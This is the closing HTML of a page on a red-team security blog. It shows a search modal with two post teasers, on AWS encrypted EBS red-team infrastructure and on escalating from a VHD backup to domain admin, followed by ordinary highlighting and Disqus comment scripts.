              <a class="link-unstyled" href="https://rastamouse.me/2018/02/red-team-infrastructure---aws-encrypted-ebs/">
                <h3 class="media-heading">Red Team Infrastructure - AWS Encrypted EBS</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Feb 2, 2018
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p><a href="https://twitter.com/malcomvetter">Tim MalcomVetter</a> caused a bit of stir over his <a href="https://medium.com/@malcomvetter/responsible-red-teams-1c6209fd43cc">Responsible Red Teams</a> post last week, which is not surprising since he was pretty fucking rude about the whole thing.</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2018/02/vhd-to-da/">
                <h3 class="media-heading">VHD to DA</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Feb 2, 2018
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>Where a 10-year old backup can fcuk you in the ass&hellip;</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
      </div>
    </div>
    <div class="modal-footer">
      <p class="results-count text-medium"
         data-message-zero="no post found"
         data-message-one="1 post found"
         data-message-other="{n} posts found">
         18 posts found
      </p>
    </div>
  </div>
</div>
    
  
    
    <div id="cover" style="background-image:url('https://rastamouse.me/images/cover.jpg');"></div>
  


    
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.js"></script>


<script src="https://rastamouse.me/js/script-wl33z0n6ocaypepiqrazthtivfrliqijej4rq8ek8gvrv1awftmgjuv8k4zc.min.js"></script>

<script>
$(document).ready(function() {
  hljs.configure({ classPrefix: '', useBR: false });
  $('pre.code-highlight').each(function(i, block) {
    var code = "";
    hljs.highlightAuto(block.innerText).value.split(/\r\n|\r|\n/).forEach(function(line) {
      code += "<span class=\"line\">" + line + "</span><br>";
    });
    if (code.length > 0) {
      block.innerHTML = code;  
    }
  });
  $('pre > code').each(function(i, block) {
    $(this).addClass('codeblock');
    hljs.highlightBlock(block);
  });
});
</script>

  
    
      <script>
        var disqus_config = function () {
          this.page.url = 'https:\/\/rastamouse.me\/2018\/03\/a-view-of-persistence\/';
          
            this.page.identifier = '\/2018\/03\/a-view-of-persistence\/'
          
        };
        (function() {
          
          
          if (window.location.hostname == "localhost") {
            return;
          }
          var d = document, s = d.createElement('script');
          var disqus_shortname = 'rastamouse';
          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';

          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
    
  





    
  </body>
</html>

